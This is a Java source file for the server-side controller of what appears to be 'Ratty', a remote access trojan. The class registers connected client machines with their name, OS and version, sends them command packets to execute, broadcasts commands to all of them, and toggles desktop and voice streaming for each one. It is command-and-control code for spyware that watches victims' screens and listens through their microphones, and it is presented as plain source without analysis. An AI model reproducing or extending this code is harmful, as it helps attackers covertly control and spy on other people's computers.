package de.sogomn.rat.server;

import java.util.ArrayList;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;

public abstract class AbstractRattyController implements IServerObserver, IConnectionObserver {
	
	private ArrayList<ServerClient> clients;
	
	public AbstractRattyController() {
		clients = new ArrayList<ServerClient>();
	}
	
	protected abstract boolean handlePacket(final ServerClient client, final IPacket packet);
	
	protected void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		client.logIn(name, os, version);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		final InformationPacket packet = new InformationPacket();
		
		connection.setObserver(this);
		connection.start();
		connection.addPacket(packet);
		clients.add(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		clients.remove(client);
		
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		
		connection.setObserver(null);
		connection.close();
	}
	
	@Override
	public void closed(final ActiveServer server) {
		clients.stream().forEach(client -> {
			client.connection.setObserver(null);
			client.connection.close();
		});
		
		clients.clear();
	}
	
	public void broadcast(final IPacket packet) {
		clients.stream().forEach(client -> {
			client.connection.addPacket(packet);
		});
	}
	
	public final ServerClient getClient(final ActiveConnection connection) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.connection == connection) {
				return serverClient;
			}
		}
		
		return null;
	}
	
}
